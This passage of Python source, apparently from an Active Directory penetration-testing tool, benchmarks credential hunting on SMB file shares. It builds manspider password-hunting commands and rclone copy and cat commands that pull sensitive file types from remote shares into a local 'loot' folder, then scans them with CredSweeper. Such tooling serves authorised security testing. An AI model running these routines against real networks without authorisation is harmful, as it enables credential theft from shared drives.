                    _run_cifs_artifact_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    use_mapping=use_mapping,
                    aggregate_map_path=aggregate_map_path,
                )
            return _with_mapping_timing(_run_full_production_like_backend_benchmark(
                credential_runner=credential_runner,
                artifact_runner=artifact_runner,
            ))
        if scenario.read_mode == "full_mount":
            return _with_mapping_timing(_run_cifs_full_mount_credsweeper_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
                benchmark_profile=benchmark_profile,
                benchmark_scope=scenario.benchmark_scope,
                benchmark_execution_mode=scenario.benchmark_execution_mode,
            ))
        return _with_mapping_timing(_run_cifs_credsweeper_benchmark(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            username=username,
            password=password,
            share_map=share_map,
            benchmark_profile=benchmark_profile,
            benchmark_scope=scenario.benchmark_scope,
            benchmark_execution_mode=scenario.benchmark_execution_mode,
            use_mapping=use_mapping,
            aggregate_map_path=aggregate_map_path,
        ))

    return _with_mapping_timing({"success": False})


def _run_credsweeper_path_scan_with_scope(
    *,
    credsweeper_service: Any,
    credsweeper_path: str,
    path_to_scan: str,
    json_output_dir: str,
    benchmark_scope: str,
    candidate_files: int | None = None,
    jobs: int | None = None,
    find_by_ext: bool = False,
) -> dict[str, list[tuple[str, float | None, str, int, str]]]:
    """Run one CredSweeper path scan with scope-aware document semantics."""
    common_kwargs = {
        "credsweeper_path": credsweeper_path,
        "json_output_dir": json_output_dir,
        "include_custom_rules": True,
        "rules_profile": CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
        "custom_ml_threshold": "0.0",
        "jobs": jobs,
        "find_by_ext": find_by_ext,
        "timeout": get_default_credsweeper_timeout(candidate_files=candidate_files),
    }
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY:
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            candidate_files=candidate_files,
        )
        return credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL:
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            depth=True,
            candidate_files=candidate_files,
        )
        return credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            depth=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED:
        text_findings = credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=False,
            **common_kwargs,
        )
        common_kwargs["rules_profile"] = CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC
        common_kwargs["timeout"] = get_default_credsweeper_timeout(
            doc=True,
            candidate_files=candidate_files,
        )
        doc_findings = credsweeper_service.analyze_path_with_options(
            path_to_scan,
            doc=True,
            **common_kwargs,
        )
        return _merge_grouped_credential_findings(text_findings, doc_findings)
    return credsweeper_service.analyze_path_with_options(
        path_to_scan,
        doc=False,
        **common_kwargs,
    )


def _run_credsweeper_benchmark_path_scan(
    *,
    credsweeper_service: Any,
    credsweeper_path: str,
    path_to_scan: str,
    json_output_dir: str,
    benchmark_scope: str,
    jobs: int | None = None,
    find_by_ext: bool = False,
) -> dict[str, list[tuple[str, float | None, str, int, str]]]:
    """Backward-compatible benchmark wrapper around scoped CredSweeper scan."""
    return _run_credsweeper_path_scan_with_scope(
        credsweeper_service=credsweeper_service,
        credsweeper_path=credsweeper_path,
        path_to_scan=path_to_scan,
        json_output_dir=json_output_dir,
        benchmark_scope=benchmark_scope,
        jobs=jobs,
        find_by_ext=find_by_ext,
    )


def _run_credsweeper_library_benchmark_target_scan(
    *,
    library_service: Any,
    targets: list[Any],
    benchmark_scope: str,
    jobs: int | None = None,
) -> dict[str, list[tuple[str, float | None, str, int, str]]]:
    """Run one in-memory CredSweeper library benchmark with scope-aware semantics."""
    common_kwargs = {
        "include_custom_rules": True,
        "jobs": jobs,
    }
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY:
        return library_service.analyze_targets_with_options(
            targets,
            rules_profile=CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC,
            doc=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL:
        return library_service.analyze_targets_with_options(
            targets,
            rules_profile=CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC,
            doc=True,
            depth=True,
            **common_kwargs,
        )
    if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED:
        text_findings = library_service.analyze_targets_with_options(
            targets,
            rules_profile=CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
            doc=False,
            **common_kwargs,
        )
        doc_findings = library_service.analyze_targets_with_options(
            targets,
            rules_profile=CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC,
            doc=True,
            **common_kwargs,
        )
        return _merge_grouped_credential_findings(text_findings, doc_findings)
    return library_service.analyze_targets_with_options(
        targets,
        rules_profile=CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
        doc=False,
        **common_kwargs,
    )


def _build_manspider_passw_command(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    loot_dir: str,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
) -> str:
    """Build the legacy manspider password-hunting command."""
    manspider_bin = shlex.quote(str(getattr(shell, "manspider_path", "manspider")))
    hosts_str = " ".join(shlex.quote(str(host)) for host in hosts)
    loot_dir_arg = shlex.quote(str(loot_dir))
    extensions_arg = " ".join(
        shlex.quote(extension)
        for extension in get_manspider_sensitive_extensions(
            benchmark_profile
        )
    )
    domain_auth = str(
        getattr(shell, "domains_data", {}).get(domain, {}).get("auth", "")
    ).strip()
    exclusion_args = build_manspider_exclusion_args()
    max_filesize_arg = ""
    if str(benchmark_profile or "").strip() == SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY:
        max_file_size_bytes = get_sensitive_phase_max_file_size_bytes(
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS
        )
        if isinstance(max_file_size_bytes, int) and max_file_size_bytes > 0:
            max_file_size_mb = max(1, int(max_file_size_bytes // (1024 * 1024)))
            max_filesize_arg = f"--max-filesize {max_file_size_mb}M "
    if domain_auth == "auth":
        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
        return (
            f"{manspider_bin} --threads 256 {hosts_str} {auth} "
            f"-e {extensions_arg} -l {loot_dir_arg} "
            f"{max_filesize_arg}{exclusion_args}"
        )
    return (
        f"{manspider_bin} --threads 256 {hosts_str} "
        f"-e {extensions_arg} -l {loot_dir_arg} "
        f"{max_filesize_arg}{exclusion_args}"
    )


def _build_manspider_extensions_command(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    loot_dir: str,
    extensions: tuple[str, ...],
) -> str:
    """Build a manspider command for artifact-style extension hunting."""
    manspider_bin = shlex.quote(str(getattr(shell, "manspider_path", "manspider")))
    hosts_str = " ".join(shlex.quote(str(host)) for host in hosts)
    loot_dir_arg = shlex.quote(str(loot_dir))
    extensions_arg = " ".join(shlex.quote(str(extension)) for extension in extensions)
    domain_auth = str(
        getattr(shell, "domains_data", {}).get(domain, {}).get("auth", "")
    ).strip()
    exclusion_args = build_manspider_exclusion_args()
    if domain_auth == "auth":
        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
        return (
            f"{manspider_bin} --threads 256 {hosts_str} {auth} "
            f"-e {extensions_arg} -l {loot_dir_arg} "
            f"--max-filesize {GLOBAL_SMB_HEAVY_ARTIFACT_MAX_FILESIZE_MB}M {exclusion_args}"
        )
    return (
        f"{manspider_bin} --threads 256 {hosts_str} "
        f"-e {extensions_arg} -l {loot_dir_arg} "
        f"--max-filesize {GLOBAL_SMB_HEAVY_ARTIFACT_MAX_FILESIZE_MB}M {exclusion_args}"
    )


def _resolve_rclone_benchmark_parallelism() -> int:
    """Return default worker count for parallel rclone cat fetches."""
    return max(1, min(8, int(os.cpu_count() or 4)))


def _resolve_rclone_cat_parallelism() -> int:
    """Return worker count for parallel rclone cat benchmark fetches."""
    return max(1, _resolve_rclone_benchmark_parallelism())


def _is_rclone_small_file_profile(benchmark_profile: str) -> bool:
    """Return True when one benchmark profile mostly targets small text-like files."""
    return str(benchmark_profile or "").strip() == SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY


def _ensure_rclone_available(shell: Any) -> str | None:
    """Validate rclone availability and return its resolved executable path."""
    rclone_path = _resolve_rclone_path(shell)
    version_result = shell.run_command(
        f"{shlex.quote(rclone_path)} version",
        timeout=30,
        ignore_errors=True,
    )
    if version_result is None or int(getattr(version_result, "returncode", 1)) != 0:
        print_warning("rclone is not configured or not available. Skipping rclone benchmark.")
        return None
    return rclone_path


def _build_rclone_include_args(
    *,
    extensions: tuple[str, ...],
) -> str:
    """Build repeated rclone include filters for one shared extension whitelist."""
    patterns: list[str] = []
    seen: set[str] = set()
    for extension in extensions:
        normalized = str(extension or "").strip().casefold()
        if not normalized.startswith("."):
            continue
        pattern = f"*{normalized}"
        if pattern in seen:
            continue
        seen.add(pattern)
        patterns.append(f"--include {shlex.quote(pattern)}")
    return " ".join(patterns)


def _build_rclone_copy_command(
    *,
    rclone_path: str,
    remote: str,
    destination_dir: str,
    extensions: tuple[str, ...],
    tuning: RcloneTuning,
    max_size_bytes: int | None = None,
) -> str:
    """Build one rclone copy command for a filtered SMB share download."""
    include_args = _build_rclone_include_args(extensions=extensions)
    destination_arg = shlex.quote(str(destination_dir))
    command_parts = [
        shlex.quote(rclone_path),
        "copy",
        shlex.quote(remote),
        destination_arg,
        "--checkers",
        str(max(1, int(tuning.checkers))),
        "--transfers",
        str(max(1, int(tuning.transfers))),
        "--buffer-size",
        shlex.quote(str(tuning.buffer_size)),
        "--ignore-times",
    ]
    if include_args:
        command_parts.append(include_args)
    if isinstance(max_size_bytes, int) and max_size_bytes > 0:
        max_size_mb = max(1, int(max_size_bytes // (1024 * 1024)))
        command_parts.extend(["--max-size", f"{max_size_mb}M"])
    return " ".join(command_parts)


def _build_rclone_copy_files_from_command(
    *,
    rclone_path: str,
    remote: str,
    destination_dir: str,
    files_from_path: str,
    tuning: RcloneTuning,
    max_size_bytes: int | None = None,
) -> str:
    """Build one rclone copy command constrained by files-from manifest."""
    destination_arg = shlex.quote(str(destination_dir))
    files_from_arg = shlex.quote(str(files_from_path))
    command_parts = [
        shlex.quote(rclone_path),
        "copy",
        shlex.quote(remote),
        destination_arg,
        "--files-from-raw",
        files_from_arg,
        "--checkers",
        str(max(1, int(tuning.checkers))),
        "--transfers",
        str(max(1, int(tuning.transfers))),
        "--buffer-size",
        shlex.quote(str(tuning.buffer_size)),
        "--ignore-times",
        "--no-traverse",
    ]
    if isinstance(max_size_bytes, int) and max_size_bytes > 0:
        max_size_mb = max(1, int(max_size_bytes // (1024 * 1024)))
        command_parts.extend(["--max-size", f"{max_size_mb}M"])
    return " ".join(command_parts)


def _build_rclone_cat_command(
    *,
    rclone_path: str,
    remote_file: str,
) -> str:
    """Build one rclone cat command for an exact remote file path."""
    return f"{shlex.quote(rclone_path)} cat {shlex.quote(remote_file)}"


def _resolve_rclone_benchmark_root(
    *,
    shell: Any,
    domain: str,
    purpose: str,
) -> str:
    """Return one workspace-scoped root directory for rclone benchmark artifacts."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        purpose,
    )


def _generate_rclone_mapping(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
    run_output_abs: str,
    aggregate_map_abs: str,
) -> dict[str, Any]:
    """Generate one fresh rclone mapping and merge it into an aggregate JSON."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {"success": False}
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
    ):
        print_warning_debug(
            "Skipping rclone mapping because SMB null-session auth is not supported "
            "by the rclone SMB backend."
        )
        return {"success": False}

    os.makedirs(run_output_abs, exist_ok=True)
    share_map_hosts = 0
    share_map_pairs = 0
    if isinstance(share_map, dict):
        for host_name, host_shares in share_map.items():
            if not str(host_name or "").strip() or not isinstance(host_shares, dict):
                continue
            readable_pairs = 0
            for share_name, perms in host_shares.items():
                normalized_share = str(share_name or "").strip()
                perms_text = str(perms or "").strip().lower()
                if (
                    not normalized_share
                    or _is_globally_excluded_mapping_share(normalized_share)
                    or "read" not in perms_text
                ):
                    continue
                readable_pairs += 1
            if readable_pairs <= 0:
                continue
            share_map_hosts += 1
            share_map_pairs += readable_pairs

    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    fallback_used = not (isinstance(share_map, dict) and bool(share_map_pairs))
    print_info_debug(
        "rclone mapping target resolution: "
        f"source={'share_map' if not fallback_used else 'hosts_x_shares_fallback'} "
        f"resolved_targets={len(target_pairs)} share_map_hosts={share_map_hosts} "
        f"share_map_pairs={share_map_pairs} fallback_used={fallback_used} "
        f"hosts={len(hosts)} shares={len(shares)}"
    )
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    rclone_service = RcloneShareMappingService()
    mapping_result = rclone_service.generate_host_metadata_json(
        run_output_dir=run_output_abs,
        host_share_targets=target_pairs,
        username=transport_username,
        password=transport_password,
        domain=transport_domain,
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        timeout_seconds=1200,
    )
    run_id = Path(run_output_abs).name
    share_mapping_service = ShareMappingService()
    share_mapping_service.merge_spider_plus_run(
        domain=domain,
        principal=f"{domain}\\{username}",
        run_id=run_id,
        run_output_dir=run_output_abs,
        aggregate_map_path=aggregate_map_abs,
        requested_hosts=hosts,
        requested_shares=shares,
        host_share_permissions=share_map,
    )
    return {
        "success": bool(int(mapping_result.get("host_json_files", 0) or 0) > 0),
        "mapped_shares": int(mapping_result.get("mapped_shares", 0) or 0),
        "partial_targets": int(mapping_result.get("partial_targets", 0) or 0),
        "failed_targets": int(mapping_result.get("failed_targets", 0) or 0),
        "aggregate_map_path": aggregate_map_abs,
        "run_output_dir": run_output_abs,
    }


def _generate_rclone_benchmark_mapping(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
    purpose: str,
) -> tuple[str | None, dict[str, Any]]:
    """Generate one benchmark-scoped rclone aggregate map for later exact downloads."""
    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return None, {"success": False}

    benchmark_root_abs = _resolve_rclone_benchmark_root(
        shell=shell,
        domain=domain,
        purpose=purpose,
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    mapping_root_abs = os.path.join(benchmark_root_abs, "mapping")
    os.makedirs(mapping_root_abs, exist_ok=True)
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_output_abs = os.path.join(mapping_root_abs, "runs", f"{run_id}_{_slugify_token(username)}")
    os.makedirs(run_output_abs, exist_ok=True)
    aggregate_map_abs = os.path.join(mapping_root_abs, "share_tree_map.json")
    mapping_result = _generate_rclone_mapping(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        hosts=hosts,
        shares=shares,
        share_map=share_map,
        run_output_abs=run_output_abs,
        aggregate_map_abs=aggregate_map_abs,
    )
    return aggregate_map_abs, mapping_result


def _write_rclone_files_from_manifest(
    *,
    manifest_dir: str,
    host: str,
    share: str,
    remote_paths: list[str],
) -> str:
    """Write one files-from-raw manifest for a host/share exact download."""
    os.makedirs(manifest_dir, exist_ok=True)
    manifest_name = f"{_slugify_token(host)}__{_slugify_token(share)}.txt"
    manifest_path = os.path.join(manifest_dir, manifest_name)
    with open(manifest_path, "w", encoding="utf-8") as handle:
        for remote_path in remote_paths:
            normalized = str(remote_path or "").strip().replace("\\", "/")
            if not normalized:
                continue
            handle.write(normalized + "\n")
    return manifest_path


def _build_rclone_remote_file_path(
    *,
    remote_share: str,
    remote_path: str,
) -> str:
    """Build one rclone remote file path from share root and relative file path."""
    normalized_path = str(remote_path or "").strip().replace("\\", "/").lstrip("/")
    if not normalized_path:
        return remote_share
    return f"{remote_share}/{normalized_path}"


def _run_rclone_copy_loot_download(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    target_pairs: list[tuple[str, str]],
    loot_dir: str,
    extensions: tuple[str, ...],
    mostly_small_files: bool = True,
    operation_label: str = "benchmark",
    max_size_bytes: int | None = None,
) -> dict[str, Any]:
    """Download matching SMB share files with rclone into one local loot tree."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {"success": False, "copied_targets": 0, "failed_targets": len(target_pairs)}
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    ):
        print_warning_debug(
            f"Skipping rclone {operation_label}: "
            f"{_get_rclone_unsupported_smb_auth_reason(shell, domain=domain, username=username, password=password)}"
        )
        return {"success": False, "copied_targets": 0, "failed_targets": len(target_pairs)}

    service = RcloneShareMappingService()
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    obscured_password = service.obscure_password(
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        password=transport_password,
    )
    if transport_password and obscured_password == "":
        print_warning(
            f"rclone could not obscure the SMB password. Skipping rclone {operation_label}."
        )
        return {"success": False, "copied_targets": 0, "failed_targets": len(target_pairs)}

    tuning = choose_rclone_tuning(
        target_count=len(target_pairs),
        mostly_small_files=mostly_small_files,
    )
    copied_targets = 0
    failed_targets = 0
    partial_targets = 0
    print_info_debug(
        f"rclone {operation_label} tuning: "
        f"targets={len(target_pairs)} workers={tuning.target_workers} "
        f"transfers={tuning.transfers} checkers={tuning.checkers} "
        f"buffer_size={tuning.buffer_size}"
    )

    def _download_one_target(target: tuple[str, str]) -> dict[str, Any]:
        host, share = target
        remote = service.build_smb_remote(
            host=host,
            share=share,
            username=transport_username,
            obscured_password=obscured_password,
            domain=transport_domain,
        )
        target_loot_dir = os.path.join(loot_dir, host, share)
        os.makedirs(target_loot_dir, exist_ok=True)
        command = _build_rclone_copy_command(
            rclone_path=rclone_path,
            remote=remote,
            destination_dir=target_loot_dir,
            extensions=extensions,
            tuning=tuning,
            max_size_bytes=max_size_bytes,
        )
        print_info_debug(
            f"rclone {operation_label} download command: "
            f"host={mark_sensitive(host, 'host')} share={mark_sensitive(share, 'share')} "
            f"command={command}"
        )
        result = shell.run_command(
            command,
            timeout=1200,
            ignore_errors=True,
        )
        copied_file_count = _count_files_under_path(target_loot_dir)
        if result is None:
            return {"status": "failed", "host": host, "share": share, "rc": None}
        return_code = int(getattr(result, "returncode", 1))
        if return_code == 0:
            return {"status": "copied", "host": host, "share": share, "rc": return_code}
        if copied_file_count > 0:
            return {
                "status": "partial",
                "host": host,
                "share": share,
                "rc": return_code,
            }
        return {"status": "failed", "host": host, "share": share, "rc": return_code}

    if target_pairs:
        with ThreadPoolExecutor(max_workers=tuning.target_workers) as executor:
            futures = {
                executor.submit(_download_one_target, target): target
                for target in target_pairs
            }
            for future in as_completed(futures):
                result = future.result()
                status = str(result.get("status", "failed"))
                host = str(result.get("host", ""))
                share = str(result.get("share", ""))
                rc = result.get("rc")
                if status == "copied":
                    copied_targets += 1
                    continue
                if status == "partial":
                    partial_targets += 1
                    copied_targets += 1
                    print_warning_debug(
                        f"rclone {operation_label} target returned non-zero after partial download: "
                        f"host={host} share={share} rc={rc}"
                    )
                    continue
                failed_targets += 1
                print_warning_debug(
                    f"rclone {operation_label} target download failed: "
                    f"host={host} share={share} rc={rc}"
                )

    return {
        "success": copied_targets > 0 or (not target_pairs),
        "copied_targets": copied_targets,
        "partial_targets": partial_targets,
        "failed_targets": failed_targets,
    }


def _run_rclone_copy_mapped_loot_download(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    grouped_remote_paths: dict[tuple[str, str], list[str]],
    loot_dir: str,
    manifest_dir: str,
    mostly_small_files: bool = True,
    operation_label: str = "mapped benchmark",
    max_size_bytes: int | None = None,
) -> dict[str, Any]:
    """Download exact remote paths with rclone using files-from manifests."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {"success": False, "copied_targets": 0, "failed_targets": len(grouped_remote_paths)}
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    ):
        print_warning_debug(
            f"Skipping rclone {operation_label}: "
            f"{_get_rclone_unsupported_smb_auth_reason(shell, domain=domain, username=username, password=password)}"
        )
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(grouped_remote_paths),
        }

    service = RcloneShareMappingService()
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    obscured_password = service.obscure_password(
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        password=transport_password,
    )
    if transport_password and obscured_password == "":
        print_warning(
            f"rclone could not obscure the SMB password. Skipping rclone {operation_label}."
        )
        return {"success": False, "copied_targets": 0, "failed_targets": len(grouped_remote_paths)}

    tuning = choose_rclone_tuning(
        target_count=len(grouped_remote_paths),
        mostly_small_files=mostly_small_files,
    )
    copied_targets = 0
    failed_targets = 0
    partial_targets = 0
    print_info_debug(
        f"rclone {operation_label} tuning: "
        f"targets={len(grouped_remote_paths)} workers={tuning.target_workers} "
        f"transfers={tuning.transfers} checkers={tuning.checkers} "
        f"buffer_size={tuning.buffer_size}"
    )

    def _download_one_target(
        target: tuple[tuple[str, str], list[str]]
    ) -> dict[str, Any]:
        (host, share), remote_paths = target
        if not remote_paths:
            return {"status": "skipped", "host": host, "share": share, "rc": 0}
        remote = service.build_smb_remote(
            host=host,
            share=share,
            username=transport_username,
            obscured_password=obscured_password,
            domain=transport_domain,
        )
        manifest_path = _write_rclone_files_from_manifest(
            manifest_dir=manifest_dir,
            host=host,
            share=share,
            remote_paths=remote_paths,
        )
        target_loot_dir = os.path.join(loot_dir, host, share)
        os.makedirs(target_loot_dir, exist_ok=True)
        command = _build_rclone_copy_files_from_command(
            rclone_path=rclone_path,
            remote=remote,
            destination_dir=target_loot_dir,
            files_from_path=manifest_path,
            tuning=tuning,
            max_size_bytes=max_size_bytes,
        )
        print_info_debug(
            f"rclone {operation_label} download command: "
            f"host={mark_sensitive(host, 'host')} share={mark_sensitive(share, 'share')} "
            f"command={command}"
        )
        result = shell.run_command(
            command,
            timeout=1200,
            ignore_errors=True,
        )
        copied_file_count = _count_files_under_path(target_loot_dir)
        if result is None:
            return {"status": "failed", "host": host, "share": share, "rc": None}
        return_code = int(getattr(result, "returncode", 1))
        if return_code == 0:
            return {"status": "copied", "host": host, "share": share, "rc": return_code}
        if copied_file_count > 0:
            return {
                "status": "partial",
                "host": host,
                "share": share,
                "rc": return_code,
            }
        return {"status": "failed", "host": host, "share": share, "rc": return_code}

    if grouped_remote_paths:
        with ThreadPoolExecutor(max_workers=tuning.target_workers) as executor:
            futures = {
                executor.submit(_download_one_target, item): item
                for item in grouped_remote_paths.items()
            }
            for future in as_completed(futures):
                result = future.result()
                status = str(result.get("status", "failed"))
                host = str(result.get("host", ""))
                share = str(result.get("share", ""))
                rc = result.get("rc")
                if status in {"copied", "skipped"}:
                    if status == "copied":
                        copied_targets += 1
                    continue
                if status == "partial":
                    partial_targets += 1
                    copied_targets += 1
                    print_warning_debug(
                        f"rclone {operation_label} target returned non-zero after partial download: "
                        f"host={host} share={share} rc={rc}"
                    )
                    continue
                failed_targets += 1
                print_warning_debug(
                    f"rclone {operation_label} target download failed: "
                    f"host={host} share={share} rc={rc}"
                )

    return {
        "success": copied_targets > 0 or (not grouped_remote_paths),
        "copied_targets": copied_targets,
        "partial_targets": partial_targets,
        "failed_targets": failed_targets,
    }


def _run_rclone_cat_library_fetch(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    grouped_remote_paths: dict[tuple[str, str], list[str]],
    tuning: RcloneCatTuning,
) -> list[dict[str, Any]]:
    """Fetch exact remote files via rclone cat for in-memory library scanning."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )

    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return []
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    ):
        print_warning_debug(
            "Skipping in-memory rclone benchmark: "
            f"{_get_rclone_unsupported_smb_auth_reason(shell, domain=domain, username=username, password=password)}"
        )
        return []

    service = RcloneShareMappingService()
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    obscured_password = service.obscure_password(
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        password=transport_password,
    )
    if transport_password and obscured_password == "":
        print_warning(
            "rclone could not obscure the SMB password. Skipping in-memory rclone benchmark."
        )
        return []

    fetch_tasks: list[tuple[int, str, str, str, str]] = []
    task_index = 0
    for (host, share), remote_paths in grouped_remote_paths.items():
        remote_share = service.build_smb_remote(
            host=host,
            share=share,
            username=transport_username,
            obscured_password=obscured_password,
            domain=transport_domain,
        )
        for remote_path in remote_paths:
            remote_file = _build_rclone_remote_file_path(
                remote_share=remote_share,
                remote_path=remote_path,
            )
            fetch_tasks.append((task_index, host, share, remote_path, remote_file))
            task_index += 1

    if not fetch_tasks:
        return []

    max_workers = min(max(1, int(tuning.fetch_workers)), len(fetch_tasks))
    print_info_debug(
        "rclone library benchmark fetch plan: "
        f"targets={len(fetch_tasks)} workers={max_workers} "
        f"analysis_jobs={tuning.analysis_jobs}"
    )

    def _fetch_one(task: tuple[int, str, str, str, str]) -> tuple[int, dict[str, Any] | None]:
        index, host, share, remote_path, remote_file = task
        command = _build_rclone_cat_command(
            rclone_path=rclone_path,
            remote_file=remote_file,
        )
        print_info_debug(
            "rclone library benchmark cat command: "
            f"host={mark_sensitive(host, 'host')} share={mark_sensitive(share, 'share')} "
            f"path={mark_sensitive(remote_path, 'path')} command={command}"
        )
        result = shell.run_command(
            command,
            timeout=300,
            ignore_errors=True,
            text=False,
            capture_output=True,
            use_clean_env=True,
        )
        if result is None:
            return index, None
        return_code = int(getattr(result, "returncode", 1))
        stdout_payload = getattr(result, "stdout", b"") or b""
        if return_code != 0 or not isinstance(stdout_payload, bytes):
            print_warning_debug(
                "rclone library benchmark cat failed: "
                f"host={host} share={share} path={remote_path} rc={return_code}"
            )
            return index, None
        return (
            index,
            {
                "content": stdout_payload,
                "file_path": f"{host}/{share}/{remote_path}".replace("\\", "/"),
                "file_type": Path(remote_path).suffix or "",
                "info": f"RCLONE_CAT:{host}/{share}",
            },
        )

    ordered_results: dict[int, dict[str, Any]] = {}
    if max_workers <= 1:
        for task in fetch_tasks:
            index, payload = _fetch_one(task)
            if payload is not None:
                ordered_results[index] = payload
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(_fetch_one, task) for task in fetch_tasks]
            for future in as_completed(futures):
                index, payload = future.result()
                if payload is not None:
                    ordered_results[index] = payload

    return [ordered_results[index] for index in sorted(ordered_results)]


def _run_manspider_credsweeper_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
) -> dict[str, Any]:
    """Run non-interactive legacy manspider + CredSweeper benchmark."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_manspider_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_manspider_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
            ]
        )
